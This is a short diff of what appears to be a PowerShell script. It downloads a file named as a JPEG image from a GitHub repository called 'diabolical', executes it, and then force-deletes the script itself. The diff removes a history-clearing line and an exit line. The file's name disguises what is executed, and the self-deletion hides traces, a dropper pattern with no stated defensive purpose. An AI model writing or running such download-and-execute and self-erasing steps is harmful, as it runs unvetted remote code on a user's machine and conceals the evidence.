@@ -4,7 +4,5 @@ curl -o pantalon.jpg https://raw.githubusercontent.com/SnoBroW/diabolical/main/g
 
 .\pantalon.jpg
 
-Clear-History
 Remove-Item $PSCommandPath -Force
-exit
 
